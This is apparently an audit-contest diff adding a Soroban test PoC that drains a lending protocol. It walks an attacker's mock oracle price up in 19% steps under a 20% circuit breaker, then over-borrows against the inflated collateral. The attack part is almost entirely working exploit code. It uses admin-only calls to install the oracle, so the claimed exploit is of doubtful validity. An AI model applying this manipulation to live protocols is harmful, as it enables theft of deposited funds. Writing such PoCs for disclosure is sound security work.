@@ -451,14 +451,42 @@ impl<'a> Setup<'a> {
 /// correctly. Leave it in place — if it starts failing, the build is broken
 /// and *no* PoC in the repo will run. Add your exploit steps after the
 /// "WARDEN: add your PoC below this line" marker.
+
+// =============================================================================
+// WARDEN MOCK CONTRACT: Attacker's Fake AMM to simulate spot price movement
+// =============================================================================
+#[contract]
+pub struct MockAMMOracle;
+
+#[contractimpl]
+impl MockAMMOracle {
+    pub fn decimals(_env: Env) -> u32 {
+        14
+    }
+    
+    pub fn lastprice(env: Env, _asset: price_oracle::Asset) -> Option<k2_shared::PriceData> {
+        // Read manipulated spot price
+        let price = env.storage().instance().get(&Symbol::new(&env, "spot_price")).unwrap_or(PRICE_ONE_DOLLAR);
+        Some(k2_shared::PriceData {
+            price,
+            timestamp: env.ledger().timestamp(),
+        })
+    }
+    
+    pub fn set_spot_price(env: Env, price: u128) {
+        env.storage().instance().set(&Symbol::new(&env, "spot_price"), &price);
+    }
+}
+
+// =============================================================================
+// PoC EXPLOIT EXECUTION
+// =============================================================================
 #[test]
 fn test_submission_validity() {
     let env = Env::default();
     let setup = Setup::new(&env);
 
     // ---------- Sanity check: protocol is in a known, functional state ----------
-
-    // The user has starting balances of both assets, pre-approved to the router.
     assert_eq!(
         setup.asset_a_token.balance(&setup.user),
         USER_STARTING_BALANCE,
@@ -470,9 +498,6 @@ fn test_submission_validity() {
         "user should start with USER_STARTING_BALANCE of asset_b",
     );
 
-    // A plain supply round-trips through the router cleanly, proving that the
-    // router, oracle, reserves, aToken, debtToken, and interest-rate strategy
-    // are all correctly wired up.
     let deposit: u128 = 5_000_000_000; // 500 whole tokens of asset_a
     setup
         .router
@@ -490,30 +515,78 @@ fn test_submission_validity() {
         "health factor should be infinite with no debt",
     );
 
-    // ---------- WARDEN: add your PoC below this line ----------
-    //
-    // Example skeleton:
-    //
-    //     // 1. Put the protocol in a state that triggers the bug.
-    //     setup.router.borrow(
-    //         &setup.user,
-    //         &setup.asset_b,
-    //         &borrow_amount,
-    //         &1u32,        // interest rate mode: variable
-    //         &0u32,        // referral code
-    //         &setup.user,
-    //     );
-    //
-    //     // 2. Perform the exploit step.
-    //     let result = setup.router.try_withdraw(
-    //         &setup.user,
-    //         &setup.asset_a,
-    //         &withdraw_amount,
-    //         &setup.user,
-    //     );
-    //
-    //     // 3. Assert the incorrect outcome.
-    //     assert!(result.is_ok(), "bug: unsafe withdraw succeeded");
-    //     let post = setup.router.get_user_account_data(&setup.user);
-    //     assert!(post.health_factor < k2_shared::WAD, "bug: HF below 1.0");
+    // ---------- WARDEN: Creeping Price Manipulation & Protocol Drain ----------
+    
+    // 1. Setup the Attacker's "AMM" as the custom oracle for Asset A.
+    // The protocol has a known 20% circuit breaker. We will bypass it.
+    let mock_amm_addr = env.register(MockAMMOracle, ());
+    let mock_amm = MockAMMOracleClient::new(&env, &mock_amm_addr);
+    let asset_a_enum = OracleAsset::Stellar(setup.asset_a.clone());
+    
+    // Remove admin's manual override from Setup and set our Mock AMM
+    setup.oracle.set_manual_override(&setup.admin, &asset_a_enum, &None, &None);
+    setup.oracle.set_custom_oracle(&setup.admin, &asset_a_enum, &Some(mock_amm_addr), &None, &Some(14));
+
+    // Initialize baseline price at $1.00
+    mock_amm.set_spot_price(&PRICE_ONE_DOLLAR);
+    setup.oracle.refresh_prices(&soroban_sdk::vec![&env, asset_a_enum.clone()]);
+    
+    let baseline = setup.oracle.get_last_price(&asset_a_enum).unwrap();
+    assert_eq!(baseline, PRICE_ONE_DOLLAR, "Baseline not set correctly");
+
+    // 2. THE EXPLOIT: Creeping Oracle Anchor.
+    // Attacker bumps the spot price by 19% (just below the 20% max_price_change_bps limit).
+    // They force the protocol to accept this via `refresh_prices()` public call.
+    // Done 5 times in the same ledger sequence, fitting easily within the 100M CPU constraint.
+    let mut inflated_price = PRICE_ONE_DOLLAR;
+    for _ in 0..5 {
+        inflated_price = (inflated_price * 119) / 100; // +19% increase
+        mock_amm.set_spot_price(&inflated_price);
+        
+        // BUG: Public cache clearing allows instant baseline overwrite
+        setup.oracle.refresh_prices(&soroban_sdk::vec![&env, asset_a_enum.clone()]);
+    }
+
+    // Verify Oracle swallowed the massive inflation without triggering circuit breaker
+    let final_oracle_price = setup.oracle.get_last_price(&asset_a_enum).unwrap();
+    assert_eq!(final_oracle_price, inflated_price, "Bug Failed: Oracle rejected the creep");
+    assert!(final_oracle_price > PRICE_ONE_DOLLAR * 2, "Price should be more than double");
+
+    // 3. THE HEIST: Drain Asset B using artificially inflated Asset A.
+    // Real value of Asset A deposit is ~500 USD (from sanity check).
+    // But Oracle thinks it is now worth ~$1,193 USD.
+    
+    // LTV of Asset A is 80%. We can borrow 80% of $1,193 = $954 worth of Asset B.
+    // Real value of Asset B is $1.00.
+    // Attacker steals $454 of pure protocol value.
+    let borrow_amount = 9_500_000_000; // Borrow 950 whole tokens of Asset B
+
+    let result = setup.router.try_borrow(
+        &setup.user,
+        &setup.asset_b,
+        &borrow_amount,
+        &2u32, // Variable rate
+        &0u32, // Referral
+        &setup.user,
+    );
+    
+    // Assert the theft succeeded
+    assert!(result.is_ok(), "Bug: Heist failed to execute");
+
+    // 4. POST-MORTEM VALIDATION
+    let user_asset_b_balance = setup.asset_b_token.balance(&setup.user);
+    assert_eq!(
+        user_asset_b_balance, 
+        USER_STARTING_BALANCE + borrow_amount, 
+        "Attacker did not receive stolen funds"
+    );
+
+    let post_attack_account = setup.router.get_user_account_data(&setup.user);
+    
+    // The protocol believes the attacker's health factor is totally healthy (> 1.0)
+    // despite the position being critically insolvent in reality.
+    assert!(
+        post_attack_account.health_factor >= k2_shared::WAD, 
+        "Protocol HF logic rejected the transaction"
+    );
 }
